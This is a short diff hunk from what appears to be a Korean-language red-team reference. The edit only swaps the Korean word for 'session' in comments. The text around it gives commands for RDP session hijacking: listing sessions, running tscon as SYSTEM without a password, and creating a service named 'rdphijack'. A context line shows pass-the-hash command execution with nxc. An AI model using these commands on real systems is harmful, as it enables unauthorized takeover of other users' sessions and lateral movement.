@@ -63,11 +63,11 @@ nxc smb TARGET -u admin -H HASH -x "reg add HKLM\System\CurrentControlSet\Contro
 ### RDP Session Hijacking
 
 ```powershell
-# 관리자 권한으로 다른 사용자의 RDP 세션 탈취
-# 세션 목록 확인
+# 관리자 권한으로 다른 사용자의 RDP session 탈취
+# session 목록 확인
 query user
 
-# SYSTEM 권한으로 세션 연결 (비밀번호 불필요)
+# SYSTEM 권한으로 session 연결 (비밀번호 불필요)
 tscon SESSION_ID /dest:rdp-tcp#0
 # 또는 서비스로 실행
 sc create rdphijack binpath="cmd.exe /k tscon SESSION_ID /dest:rdp-tcp#0" start=demand
